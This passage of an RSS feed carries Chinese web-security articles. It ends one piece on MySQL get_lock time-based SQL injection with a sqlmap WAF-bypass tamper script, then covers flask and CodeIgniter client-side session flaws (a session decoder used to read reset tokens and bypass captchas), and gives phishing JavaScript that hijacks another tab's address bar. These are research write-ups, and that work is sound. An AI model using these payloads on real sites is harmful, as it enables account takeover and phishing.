}
$row = mysql_fetch_array($res, MYSQL_ASSOC);
print_r($row);
mysql_query(&quot;update view set view_times=view_times+1 where id = &#39;&quot;.$id.&quot; &#39;&quot;);
?&amp;gt;&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;该案例中，我们可以构造SQL语句 ?id=1&lt;br&gt;and get_lock(‘do9gy’,1)&lt;/p&gt;&lt;p&gt;注意：由于get_lock需要变换session请求，所以当执行完第一次以后需要停滞一段时间（半分钟左右），让Apache重新打开一个连接mysql的s&lt;/p&gt;&lt;p&gt;ession，此时就可以利用get_lock进行探测了。这里给出一个基于sqlmap的tamper：&lt;/p&gt;&lt;p&gt;&lt;b&gt;sleeptogetlock.py&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;#!/usr/bin/env python

&quot;&quot;&quot;
Copyright (c) 2006-2018 sqlmap developers (http://sqlmap.org/)
See the file &#39;doc/COPYING&#39; for copying permission
&quot;&quot;&quot;

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.HIGHEST

def dependencies():
    pass

def tamper(payload, **kwargs):
    &quot;&quot;&quot;
    Replaces instances like &#39;SLEEP(A)&#39; with &quot;get_lock(&#39;do9gy&#39;,A)&quot;

    Requirement:
        * MySQL

    Tested against:
        * MySQL 5.0 and 5.5

    Notes:
        * Useful to bypass very weak and bespoke web application firewalls
          that filter the SLEEP() and BENCHMARK() functions

    &amp;gt;&amp;gt;&amp;gt; tamper(&#39;SLEEP(2)&#39;)
    &quot;get_lock(&#39;do9gy&#39;,2)&quot;
    &quot;&quot;&quot;

    if payload and payload.find(&quot;SLEEP&quot;) &amp;gt; -1:
        while payload.find(&quot;SLEEP(&quot;) &amp;gt; -1:
            index = payload.find(&quot;SLEEP(&quot;)
            depth = 1
            
            num = payload[index+6]

            
            newVal = &quot;get_lock(&#39;do9gy&#39;,%s)&quot; % (num)
            payload = payload[:index] + newVal + payload[index+8:]


    return payload
&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;当遇到网站过滤单引号的情况也可以使用 get_lock(1,1) 锁定数字变量绕过。&lt;/p&gt;&lt;p&gt;最后，想声明的是本方法只是笔者依据时间注入本质原理进行的一次探索，现实环境中不一定有大量合适的环境，最重要的是保持一颗不断突破瓶颈，抱有幻想和希望的心。如有不实之处还望诸君斧正。&lt;/p&gt;&lt;p&gt;&lt;/p&gt;</description>
<author>小蘑菇</author>
<guid isPermaLink="false">2018-04-03-35245598</guid>
<pubDate>Tue, 03 Apr 2018 00:00:00 +0800</pubDate>
</item>
<item>
<title>客户端 session 导致的安全问题</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2018-03-26-34936378.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/34936378&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-21b43848c8b14cf9e50e965b48ef5281_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;在Web中，session是认证用户身份的凭证，它具备如下几个特点：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;用户不可以任意篡改&lt;/li&gt;&lt;li&gt;A用户的session无法被B用户获取&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;也就是说，session的设计目的是为了做用户身份认证。但是，很多情况下，session被用作了别的用途，将产生一些安全问题，我们今天就来谈谈“客户端session”（client session）导致的安全问题。&lt;/p&gt;&lt;h2&gt;0x01 什么是客户端session&lt;/h2&gt;&lt;p&gt;在传统PHP开发中，&lt;code class=&quot;inline&quot;&gt;$_SESSION&lt;/code&gt;变量的内容默认会被保存在服务端的一个文件中，通过一个叫“PHPSESSID”的Cookie来区分用户。这类session是“服务端session”，用户看到的只是session的名称（一个随机字符串），其内容保存在服务端。&lt;/p&gt;&lt;p&gt;然而，并不是所有语言都有默认的session存储机制，也不是任何情况下我们都可以向服务器写入文件。所以，很多Web框架都会另辟蹊径，比如Django默认将session存储在数据库中，而对于flask这里并不包含数据库操作的框架，就只能将session存储在cookie中。&lt;/p&gt;&lt;p&gt;因为cookie实际上是存储在客户端（浏览器）中的，所以称之为“客户端session”。&lt;/p&gt;&lt;h2&gt;0x02 保护客户端session&lt;/h2&gt;&lt;p&gt;将session存储在客户端cookie中，最重要的就是解决session不能被篡改的问题。&lt;/p&gt;&lt;p&gt;我们看看flask是如何处理的：&lt;/p&gt;&lt;code lang=&quot;python&quot;&gt;class SecureCookieSessionInterface(SessionInterface):
    &quot;&quot;&quot;The default session interface that stores sessions in signed cookies
    through the :mod:`itsdangerous` module.
    &quot;&quot;&quot;
    #: the salt that should be applied on top of the secret key for the
    #: signing of cookie based sessions.
    salt = &#39;cookie-session&#39;
    #: the hash function to use for the signature. The default is sha1
    digest_method = staticmethod(hashlib.sha1)
    #: the name of the itsdangerous supported key derivation. The default
    #: is hmac.
    key_derivation = &#39;hmac&#39;
    #: A python serializer for the payload. The default is a compact
    #: JSON derived serializer with support for some extra Python types
    #: such as datetime objects or tuples.
    serializer = session_json_serializer
    session_class = SecureCookieSession

    def get_signing_serializer(self, app):
        if not app.secret_key:
            return None
        signer_kwargs = dict(
            key_derivation=self.key_derivation,
            digest_method=self.digest_method
        )
        return URLSafeTimedSerializer(app.secret_key, salt=self.salt,
                                      serializer=self.serializer,
                                      signer_kwargs=signer_kwargs)

    def open_session(self, app, request):
        s = self.get_signing_serializer(app)
        if s is None:
            return None
        val = request.cookies.get(app.session_cookie_name)
        if not val:
            return self.session_class()
        max_age = total_seconds(app.permanent_session_lifetime)
        try:
            data = s.loads(val, max_age=max_age)
            return self.session_class(data)
        except BadSignature:
            return self.session_class()

    def save_session(self, app, session, response):
        domain = self.get_cookie_domain(app)
        path = self.get_cookie_path(app)
        # Delete case. If there is no session we bail early.
        # If the session was modified to be empty we remove the
        # whole cookie.
        if not session:
            if session.modified:
                response.delete_cookie(app.session_cookie_name,
                                       domain=domain, path=path)
            return
        # Modification case. There are upsides and downsides to
        # emitting a set-cookie header each request. The behavior
        # is controlled by the :meth:`should_set_cookie` method
        # which performs a quick check to figure out if the cookie
        # should be set or not. This is controlled by the
        # SESSION_REFRESH_EACH_REQUEST config flag as well as
        # the permanent flag on the session itself.
        if not self.should_set_cookie(app, session):
            return
        httponly = self.get_cookie_httponly(app)
        secure = self.get_cookie_secure(app)
        expires = self.get_expiration_time(app, session)
        val = self.get_signing_serializer(app).dumps(dict(session))
        response.set_cookie(app.session_cookie_name, val,
                            expires=expires, httponly=httponly,
                            domain=domain, path=path, secure=secure)&lt;/code&gt;&lt;p&gt;主要看最后两行代码，新建了&lt;code class=&quot;inline&quot;&gt;URLSafeTimedSerializer&lt;/code&gt;类 ，用它的&lt;code class=&quot;inline&quot;&gt;dumps&lt;/code&gt;方法将类型为字典的session对象序列化成字符串，然后用&lt;code class=&quot;inline&quot;&gt;response.set_cookie&lt;/code&gt;将最后的内容保存在cookie中。&lt;/p&gt;&lt;p&gt;那么我们可以看一下&lt;code class=&quot;inline&quot;&gt;URLSafeTimedSerializer&lt;/code&gt;是做什么的：&lt;/p&gt;&lt;code lang=&quot;python&quot;&gt;class Signer(object):
    # …
    def sign(self, value):
        &quot;&quot;&quot;Signs the given string.&quot;&quot;&quot;
        return value + want_bytes(self.sep) + self.get_signature(value)

    def get_signature(self, value):
        &quot;&quot;&quot;Returns the signature for the given value&quot;&quot;&quot;
        value = want_bytes(value)
        key = self.derive_key()
        sig = self.algorithm.get_signature(key, value)
        return base64_encode(sig)


class Serializer(object):
    default_serializer = json
    default_signer = Signer
    # ….
    def dumps(self, obj, salt=None):
        &quot;&quot;&quot;Returns a signed string serialized with the internal serializer.
        The return value can be either a byte or unicode string depending
        on the format of the internal serializer.
        &quot;&quot;&quot;
        payload = want_bytes(self.dump_payload(obj))
        rv = self.make_signer(salt).sign(payload)
        if self.is_text_serializer:
            rv = rv.decode(&#39;utf-8&#39;)
        return rv

    def dump_payload(self, obj):
        &quot;&quot;&quot;Dumps the encoded object. The return value is always a
        bytestring. If the internal serializer is text based the value
        will automatically be encoded to utf-8.
        &quot;&quot;&quot;
        return want_bytes(self.serializer.dumps(obj))


class URLSafeSerializerMixin(object):
    &quot;&quot;&quot;Mixed in with a regular serializer it will attempt to zlib compress
    the string to make it shorter if necessary. It will also base64 encode
    the string so that it can safely be placed in a URL.
    &quot;&quot;&quot;
    def load_payload(self, payload):
        decompress = False
        if payload.startswith(b&#39;.&#39;):
            payload = payload[1:]
            decompress = True
        try:
            json = base64_decode(payload)
        except Exception as e:
            raise BadPayload(&#39;Could not base64 decode the payload because of &#39;
                &#39;an exception&#39;, original_error=e)
        if decompress:
            try:
                json = zlib.decompress(json)
            except Exception as e:
                raise BadPayload(&#39;Could not zlib decompress the payload before &#39;
                    &#39;decoding the payload&#39;, original_error=e)
        return super(URLSafeSerializerMixin, self).load_payload(json)

    def dump_payload(self, obj):
        json = super(URLSafeSerializerMixin, self).dump_payload(obj)
        is_compressed = False
        compressed = zlib.compress(json)
        if len(compressed) &amp;lt; (len(json) - 1):
            json = compressed
            is_compressed = True
        base64d = base64_encode(json)
        if is_compressed:
            base64d = b&#39;.&#39; + base64d
        return base64d


class URLSafeTimedSerializer(URLSafeSerializerMixin, TimedSerializer):
    &quot;&quot;&quot;Works like :class:`TimedSerializer` but dumps and loads into a URL
    safe string consisting of the upper and lowercase character of the
    alphabet as well as ``&#39;_&#39;``, ``&#39;-&#39;`` and ``&#39;.&#39;``.
    &quot;&quot;&quot;
    default_serializer = compact_json&lt;/code&gt;&lt;p&gt;主要关注&lt;code class=&quot;inline&quot;&gt;dump_payload&lt;/code&gt;、&lt;code class=&quot;inline&quot;&gt;dumps&lt;/code&gt;，这是序列化session的主要过程。&lt;/p&gt;&lt;p&gt;可见，序列化的操作分如下几步：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;json.dumps 将对象转换成json字符串，作为数据&lt;/li&gt;&lt;li&gt;如果数据压缩后长度更短，则用zlib库进行压缩&lt;/li&gt;&lt;li&gt;将数据用base64编码&lt;/li&gt;&lt;li&gt;通过hmac算法计算数据的签名，将签名附在数据后，用“.”分割&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;第4步就解决了用户篡改session的问题，因为在不知道secret_key的情况下，是无法伪造签名的。&lt;/p&gt;&lt;p&gt;最后，我们在cookie中就能看到设置好的session了：&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-310bda7796d4d07ae78abb4813d76b6a_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;552&quot; data-rawheight=&quot;295&quot;&gt;&lt;p&gt;注意到，在第4步中，flask仅仅对数据进行了签名。众所周知的是，签名的作用是防篡改，而无法防止被读取。而flask并没有提供加密操作，所以其session的全部内容都是可以在客户端读取的，这就可能造成一些安全问题。&lt;/p&gt;&lt;h2&gt;0x03 flask客户端session导致敏感信息泄露&lt;/h2&gt;&lt;p&gt;我曾遇到过一个案例，目标是flask开发的一个简历管理系统，在测试其找回密码功能的时候，我收到了服务端设置的session。&lt;/p&gt;&lt;p&gt;我在0x02中说过，flask是一个客户端session，所以看目标为flask的站点的时候，我习惯性地去解密其session。编写如下代码解密session：&lt;/p&gt;&lt;code lang=&quot;python&quot;&gt;#!/usr/bin/env python3
import sys
import zlib
from base64 import b64decode
from flask.sessions import session_json_serializer
from itsdangerous import base64_decode

def decryption(payload):
    payload, sig = payload.rsplit(b&#39;.&#39;, 1)
    payload, timestamp = payload.rsplit(b&#39;.&#39;, 1)

    decompress = False
    if payload.startswith(b&#39;.&#39;):
        payload = payload[1:]
        decompress = True

    try:
        payload = base64_decode(payload)
    except Exception as e:
        raise Exception(&#39;Could not base64 decode the payload because of &#39;
                         &#39;an exception&#39;)

    if decompress:
        try:
            payload = zlib.decompress(payload)
        except Exception as e:
            raise Exception(&#39;Could not zlib decompress the payload before &#39;
                             &#39;decoding the payload&#39;)

    return session_json_serializer.loads(payload)

if __name__ == &#39;__main__&#39;:
    print(decryption(sys.argv[1].encode()))&lt;/code&gt;&lt;p&gt;例如，我解密0x02中演示的session：&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-429c5066ae1eecc810a94c75d231d665_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;723&quot; data-rawheight=&quot;41&quot;&gt;&lt;p&gt;通过解密目标站点的session，我发现其设置了一个名为token、值是一串md5的键。猜测其为找回密码的认证，将其替换到找回密码链接的token中，果然能够进入修改密码页面。通过这个过程，我就能修改任意用户密码了。&lt;/p&gt;&lt;p&gt;这是一个比较典型的安全问题，目标网站通过session来储存随机token并认证用户是否真的在邮箱收到了这个token。但因为flask的session是存储在cookie中且仅签名而未加密，所以我们就可以直接读取这个token了。&lt;/p&gt;&lt;h2&gt;0x04 flask验证码绕过漏洞&lt;/h2&gt;&lt;p&gt;这是客户端session的另一个常见漏洞场景。&lt;/p&gt;&lt;p&gt;我们用一个实际例子认识这一点：&lt;a href=&quot;https://github.com/shonenada/flask-captcha&quot;&gt;https://github.com/shonenada/flask-captcha&lt;/a&gt; 。这是一个为flask提供验证码的项目，我们看到其中的view文件：&lt;/p&gt;&lt;code lang=&quot;python&quot;&gt;import random
try:
    from cStringIO import StringIO
except ImportError:
    from io import BytesIO as StringIO

from flask import Blueprint, make_response, current_app, session
from wheezy.captcha.image import captcha
from wheezy.captcha.image import background
from wheezy.captcha.image import curve
from wheezy.captcha.image import noise
from wheezy.captcha.image import smooth
from wheezy.captcha.image import text
from wheezy.captcha.image import offset
from wheezy.captcha.image import rotate
from wheezy.captcha.image import warp


captcha_bp = Blueprint(&#39;captcha&#39;, __name__)


def sample_chars():
    characters = current_app.config[&#39;CAPTCHA_CHARACTERS&#39;]
    char_length = current_app.config[&#39;CAPTCHA_CHARS_LENGTH&#39;]
    captcha_code = random.sample(characters, char_length)
    return captcha_code

@captcha_bp.route(&#39;/captcha&#39;, endpoint=&quot;captcha&quot;)
def captcha_view():
    out = StringIO()
    captcha_image = captcha(drawings=[
        background(),
        text(fonts=current_app.config[&#39;CAPTCHA_FONTS&#39;],
             drawings=[warp(), rotate(), offset()]),
        curve(),
        noise(),
        smooth(),
    ])
    captcha_code = &#39;&#39;.join(sample_chars())
    imgfile = captcha_image(captcha_code)
    session[&#39;captcha&#39;] = captcha_code
    imgfile.save(out, &#39;PNG&#39;)
    out.seek(0)
    response = make_response(out.read())
    response.content_type = &#39;image/png&#39;
    return response&lt;/code&gt;&lt;p&gt;可见，其生成验证码后，就存储在session中了：&lt;code class=&quot;inline&quot;&gt;session[&#39;captcha&#39;] = captcha_code&lt;/code&gt;。&lt;/p&gt;&lt;p&gt;我们用浏览器访问&lt;code class=&quot;inline&quot;&gt;/captcha&lt;/code&gt;，即可得到生成好的验证码图片，此时复制保存在cookie中的session值，用0x03中提供的脚本进行解码：&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-b6399058172ffe4b393e6da2df5bb9bd_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1496&quot; data-rawheight=&quot;697&quot;&gt;&lt;p&gt;可见，我成功获取了验证码的值，进而可以绕过验证码的判断。&lt;/p&gt;&lt;p&gt;这也是客户端session的一种错误使用方法。&lt;/p&gt;&lt;h2&gt;0x05 CodeIgniter 2.1.4 session伪造及对象注入漏洞&lt;/h2&gt;&lt;p&gt;Codeigniter 2的session也储存在session中，默认名为&lt;code class=&quot;inline&quot;&gt;ci_session&lt;/code&gt;，默认值如下：&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-e5edf0893d4da488de1ace08380c8635_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1484&quot; data-rawheight=&quot;655&quot;&gt;&lt;p&gt;可见，session数据被用PHP自带的serialize函数进行序列化，并签名后作为&lt;code class=&quot;inline&quot;&gt;ci_session&lt;/code&gt;的值。原理上和flask如出一辙，我就不重述了。但好在codeigniter2支持对session进行加密，只需在配置文件中设置&lt;code class=&quot;inline&quot;&gt;$config[&#39;sess_encrypt_cookie&#39;] = TRUE;&lt;/code&gt;即可。&lt;/p&gt;&lt;p&gt;在CI2.1.4及以前的版本中，存在一个弱加密漏洞（ &lt;a href=&quot;https://www.dionach.com/blog/codeigniter-session-decoding-vulnerability&quot;&gt;https://www.dionach.com/blog/codeigniter-session-decoding-vulnerability&lt;/a&gt; ），如果目标环境中没有安装Mcrypt扩展，则CI会使用一个相对比较弱的加密方式来处理session:&lt;/p&gt;&lt;code lang=&quot;php&quot;&gt;function _xor_encode($string, $key)
{
 $rand = &#39;&#39;;
 while (strlen($rand) &amp;lt; 32)
 {
  $rand .= mt_rand(0, mt_getrandmax());
 }
 $rand = $this-&amp;gt;hash($rand);
 $enc = &#39;&#39;;
 for ($i = 0; $i &amp;lt; strlen($string); $i++)
 {
  $enc .= substr($rand, ($i % strlen($rand)), 1).(substr($rand, ($i % strlen($rand)), 1) ^ substr($string, $i, 1));
 }
 return $this-&amp;gt;_xor_merge($enc, $key);
}

function _xor_merge($string, $key)
{
 $hash = $this-&amp;gt;hash($key);
 $str = &#39;&#39;;
 for ($i = 0; $i &amp;lt; strlen($string); $i++)
 {
  $str .= substr($string, $i, 1) ^ substr($hash, ($i % strlen($hash)), 1);
 }
 return $str;
}&lt;/code&gt;&lt;p&gt;其中用到了&lt;code class=&quot;inline&quot;&gt;mt_rand&lt;/code&gt;、异或等存在大量缺陷的方法。我们通过几个简单的脚本（ &lt;a href=&quot;https://github.com/Dionach/CodeIgniterXor&quot;&gt;https://github.com/Dionach/CodeIgniterXor&lt;/a&gt; ），即可在4秒到4分钟的时间，破解CI2的密钥。&lt;/p&gt;&lt;p&gt;获取到了密钥，我们即可篡改任意session，并自己签名及加密，最后伪造任意用户，注入任意对象，甚至通过反序列化操作造成更大的危害。&lt;/p&gt;&lt;h2&gt;0x06 总结&lt;/h2&gt;&lt;p&gt;我以三个案例来说明了客户端session的安全问题。&lt;/p&gt;&lt;p&gt;上述三个问题，如果session是储存在服务器文件或数据库中，则不会出现。当然，考虑到flask和ci都是非常轻量的web框架，很可能运行在无法操作文件系统或没有数据库的服务器上，所以客户端session是无法避免的。&lt;/p&gt;&lt;p&gt;除此之外，我还能想到其他客户端session可能存在的安全隐患：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;签名使用hash函数而非hmac函数，导致利用hash长度扩展攻击来伪造session&lt;/li&gt;&lt;li&gt;任意文件读取导致密钥泄露，进一步造成身份伪造漏洞或反序列化漏洞（ &lt;a href=&quot;http://www.loner.fm/drops/#!/drops/227.Codeigniter%20%E5%88%A9%E7%94%A8%E5%8A%A0%E5%AF%86Key%EF%BC%88%E5%AF%86%E9%92%A5%EF%BC%89%E7%9A%84%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E&quot;&gt;http://www.loner.fm/drops/#!/drops/227.Codeigniter%20%E5%88%A9%E7%94%A8%E5%8A%A0%E5%AF%86Key%EF%BC%88%E5%AF%86%E9%92%A5%EF%BC%89%E7%9A%84%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E&lt;/a&gt; ）&lt;/li&gt;&lt;li&gt;如果客户端session仅加密未签名，利用CBC字节翻转攻击，我们可以修改加密session中某部分数据，来达到身份伪造的目的&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;上面说的几点，各位CTF出题人可以拿去做文章啦~嘿嘿。&lt;/p&gt;&lt;p&gt;相对的，作为一个开发者，如果我们使用的web框架或web语言的session是存储在客户端中，那就必须牢记下面几点：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;没有加密时，用户可以看到完整的session对象&lt;/li&gt;&lt;li&gt;加密/签名不完善或密钥泄露的情况下，用户可以修改任意session&lt;/li&gt;&lt;li&gt;使用强健的加密及签名算法，而不是自己造（反例discuz）&lt;/li&gt;&lt;/ol&gt;</description>
<author>周佩雨</author>
<guid isPermaLink="false">2018-03-26-34936378</guid>
<pubDate>Mon, 26 Mar 2018 00:00:00 +0800</pubDate>
</item>
<item>
<title>前端黑魔法之远程控制地址栏</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2018-03-13-34495488.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/34495488&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-33395718b82a3db6e77cea8f881e7528_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;作者： &lt;a class=&quot;member_mention&quot; href=&quot;http://www.zhihu.com/people/6f8ffd80705c262c2ee3fa4d9b3f8f06&quot; data-hash=&quot;6f8ffd80705c262c2ee3fa4d9b3f8f06&quot; data-hovercard=&quot;p$b$6f8ffd80705c262c2ee3fa4d9b3f8f06&quot;&gt;@周佩雨&lt;/a&gt;&lt;/p&gt;&lt;p&gt;[ Phith0n，现就职于长亭科技，长期关注并笔耕于安全编码、代码审计等方向]&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;由于今天看到一篇文章《&lt;a href=&quot;https://paper.seebug.org/538/&quot;&gt;危险的 target=&quot;_blank&quot; 与 “opener”&lt;/a&gt;》，里面提到了一个老知识点，就是target=&quot;_blank&quot;的时候，新打开的页面可以通过window.opener来控制源页面的URL，进行钓鱼攻击。这个攻击手法我在博客《&lt;a href=&quot;https://www.leavesongs.com/HTML/opener-fishing.html&quot;&gt;神奇的opener对象&lt;/a&gt;》中也说过，这里就不再赘述了。这篇文章抛出另一种与target有关的钓鱼攻击。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;&lt;a href=&quot;https://www.leavesongs.com/PENETRATION/use-target-to-spoof-fishing.html#0x01&quot;&gt;0x01 效果演示&lt;/a&gt;&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;首先可以看一个小例子：&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;http://675ba661.2m1.pw/41593a&quot;&gt;http://675ba661.2m1.pw/41593a&lt;/a&gt;&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-90a98df05aa9c08b04f362421c4d3651_r.gif&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1154&quot; data-rawheight=&quot;764&quot; data-thumbnail=&quot;https://pic3.zhimg.com/v2-90a98df05aa9c08b04f362421c4d3651_b.jpg&quot;&gt;&lt;p&gt;打开上述链接，然后点击“click me”，打开了百度。这时查看地址栏，的的确确是百度，然后我们等待10秒，再次查看地址栏，这个时候已经变成攻击者的网址了；即使此时我们再访问淘宝等页面，只要仍然在这个标签页下，地址栏就仍然会被控制。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;&lt;a href=&quot;https://www.leavesongs.com/PENETRATION/use-target-to-spoof-fishing.html#0x02&quot;&gt;0x02 原理说明&lt;/a&gt;&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;上述页面的代码也很简单：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;&amp;lt;meta charset=&quot;utf-8&quot;&amp;gt;&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
&amp;lt;a href=&quot;https://www.baidu.com&quot; target=&quot;baidu&quot; id=&quot;baidu&quot; onclick=&quot;return start()&quot;&amp;gt;click me&amp;lt;/a&amp;gt;

&amp;lt;script&amp;gt;
function start() {
    setInterval(function() {
        baidu.href=&quot;http://675ba661.2m1.pw/baidu&quot;;
        baidu.click();
    }, 10000);
}
&amp;lt;/script&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;&lt;/code&gt;&lt;p&gt;如果用户点击了超链接“click me”，这里会启动一个循环定时器，每过10秒钟，将会将超链接的地址更换成一个仿百度的钓鱼网站，并再次点击。（当然，如果是真实攻击的话，最好是做一个真实目标的反代服务器，这个在我另一篇文章《&lt;a href=&quot;https://www.leavesongs.com/SOFT/play-with-openresty-lua-web.html&quot;&gt;openresty+lua在反向代理服务中的玩法&lt;/a&gt;》中也有详细的介绍）。&lt;/p&gt;&lt;p&gt;这里，超链接的target属性指定目标URL在哪个页面下打开，就是目标页面的window.name。如果这个a标签的href发生了变化，再次点击链接，页面仍然会在相同的标签页下打开，所以就覆盖了上一次打开的页面。&lt;/p&gt;&lt;p&gt;比如，我们是一个“网址导航”类型的恶意网站，用户在我们网站上打开了百度、淘宝等标签页面，我们将可以根据用户打开的超链接来生成钓鱼页面，伪造这些网站的登录页面，精准地进行钓鱼。我这里就不进行演示了。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;&lt;a href=&quot;https://www.leavesongs.com/PENETRATION/use-target-to-spoof-fishing.html#0x03&quot;&gt;0x03 扩展尝试&lt;/a&gt;&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;除了超链接以外，用window.open也可以达到一样的效果：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;&amp;lt;meta charset=&quot;utf-8&quot;&amp;gt;&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
&amp;lt;a href=&quot;javascript:;&quot; onclick=&quot;return start()&quot;&amp;gt;click me&amp;lt;/a&amp;gt;

&amp;lt;script&amp;gt;
function start() {
    var w = window.open(&#39;https://www.baidu.com&#39;, &#39;baidu&#39;);
    setInterval(function() {
        w.location = &#39;http://675ba661.2m1.pw/baidu&#39;
    }, 5000)
}
&amp;lt;/script&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;&lt;/code&gt;&lt;p&gt;不过，window.open经常会被广告拦截相关的功能给阻止掉，所以可能效果不如直接用超链接。&lt;/p&gt;&lt;p&gt;那么，继续深入研究。这个现象究竟是否和window.name有关呢？那么是不是我们知道了某个页面的name，即可对其页面的URL进行控制？&lt;/p&gt;&lt;p&gt;我们可以做一个实验。编写A页面（ &lt;a href=&quot;http://a.675ba661.2m1.pw/A_victim&quot;&gt;http://a.675ba661.2m1.pw/A_victim&lt;/a&gt; ）：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;&amp;lt;meta charset=&quot;utf-8&quot;&amp;gt;&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
&amp;lt;p&amp;gt;Hello world.&amp;lt;/p&amp;gt;
&amp;lt;script&amp;gt;
window.name = &#39;baidu&#39;;
&amp;lt;/script&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;&lt;/code&gt;&lt;p&gt;编写B页面（ &lt;a href=&quot;http://b.675ba661.2m1.pw/B_attacker&quot;&gt;http://b.675ba661.2m1.pw/B_attacker&lt;/a&gt; ）：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;&amp;lt;meta charset=&quot;utf-8&quot;&amp;gt;&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
&amp;lt;a href=&quot;https://www.baidu.com&quot; target=&quot;baidu&quot; id=&quot;baidu&quot;&amp;gt;click me&amp;lt;/a&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;&lt;/code&gt;&lt;p&gt;A页面是目标网站，其中设置自己的name是baidu；B是攻击者的页面，其中设置&lt;code class=&quot;inline&quot;&gt;target=&quot;baidu&quot;&lt;/code&gt; &lt;/p&gt;&lt;p&gt;显然，我们在B中点击“click me”以后，会打开一个新的页面，而不是修改A页面的URL。这个实验说明，URL的远程控制和window.name没有直接关系，而是和页面的父子关系有关。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;&lt;a href=&quot;https://www.leavesongs.com/PENETRATION/use-target-to-spoof-fishing.html#0x04&quot;&gt;0x04 总结&lt;/a&gt;&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;本文所描述的攻击方式和opener的攻击方式比较相似，都是在不能跨域的情况下，控制目标标签页的URL，进而进行钓鱼攻击。&lt;/p&gt;&lt;p&gt;但我觉得这个攻击持久型更佳，因为即使用户在新标签中输入自己的域名，或者又通过超链接点击到其他网站里，这个页面的地址栏永远是受到源页面的控制的。理论上在源页面不关闭的情况下，可以永久控制新页面的地址栏。&lt;/p&gt;</description>
<author>小蘑菇</author>
<guid isPermaLink="false">2018-03-13-34495488</guid>
<pubDate>Tue, 13 Mar 2018 00:00:00 +0800</pubDate>
</item>
<item>
<title>从SQL注入到Getshell：记一次禅道系统的渗透</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2018-03-07-34275981.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/34275981&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
